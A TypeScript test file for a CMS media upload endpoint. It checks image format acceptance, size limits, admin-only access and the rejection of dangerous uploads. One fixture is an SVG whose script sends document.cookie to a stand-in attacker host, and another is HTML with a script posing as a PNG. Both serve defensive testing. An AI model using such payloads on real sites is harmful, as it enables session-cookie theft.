import { randomBytes } from 'crypto';
import sharp from 'sharp';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createTestPayload, type TestPayload } from './helpers/test-payload';

const image = (format: 'png' | 'jpeg' | 'webp' | 'avif') =>
  sharp({
    create: { width: 32, height: 32, channels: 3, background: '#c0392b' },
  })
    .toFormat(format)
    .toBuffer();

// Random noise barely compresses: a real PNG of about 6.75 MB.
const largePng = () =>
  sharp(randomBytes(1500 * 1500 * 3), {
    raw: { width: 1500, height: 1500, channels: 3 },
  })
    .png({ compressionLevel: 0 })
    .toBuffer();

const BENIGN_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>';
const SCRIPTED_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://attacker.example.test/?c="+document.cookie)</script></svg>';

describe('Media uploads', () => {
  let t: TestPayload;
  let admin: { id: number; token: string };

  beforeAll(async () => {
    t = await createTestPayload();
    admin = await t.createUser('media-admin@example.test', 'admin');
  });

  afterAll(async () => {
    await t?.close();
  });

  async function upload(
    data: Buffer | string,
    name: string,
    type: string,
    token = admin.token,
  ) {
    const form = new FormData();
    form.append('file', new Blob([data], { type }), name);
    form.append('_payload', JSON.stringify({ alt: name }));
    return t.api('POST', '/media', { token, form });
  }

  async function mediaCount() {
    return (await t.payload.count({ collection: 'media' })).totalDocs;
  }

  it.each([
    ['png', 'image/png'],
    ['jpeg', 'image/jpeg'],
    ['webp', 'image/webp'],
    ['avif', 'image/avif'],
  ] as const)('accepts a %s image', async (format, type) => {
    const response = await upload(await image(format), `photo.${format}`, type);

    expect(response.status).toBe(201);
    expect(response.body.doc).toMatchObject({ mimeType: type });
  });

  // SVG can carry scripts, and media is served from the CMS's own origin,
  // where the admin session cookie lives.
  it.each([
    ['an SVG image', BENIGN_SVG],
    ['an SVG with a script', SCRIPTED_SVG],
  ])('rejects %s', async (_label, svg) => {
    const before = await mediaCount();

    const response = await upload(svg, 'logo.svg', 'image/svg+xml');

    expect(response.status).toBe(400);
    expect(await mediaCount()).toBe(before);
  });

  it('rejects an HTML page disguised as a PNG', async () => {
    const before = await mediaCount();

    const response = await upload(
      '<html><script>alert(1)</script></html>',
      'photo.png',
      'image/png',
    );

    expect(response.status).toBe(400);
    expect(await mediaCount()).toBe(before);
  });

  it('rejects an image larger than 5 MB', async () => {
    const before = await mediaCount();
    const data = await largePng();
    expect(data.length).toBeGreaterThan(5 * 1024 * 1024);

    const response = await upload(data, 'huge.png', 'image/png');

    expect(response.status).toBeGreaterThanOrEqual(400);
    expect(response.status).toBeLessThan(500);
    expect(await mediaCount()).toBe(before);
  });

  it('only lets administrators upload', async () => {
    const customer = await t.createUser('media-customer@example.test');

    const response = await upload(
      await image('png'),
      'photo.png',
      'image/png',
      customer.token,
    );

    expect(response.status).toBe(403);
  });
});
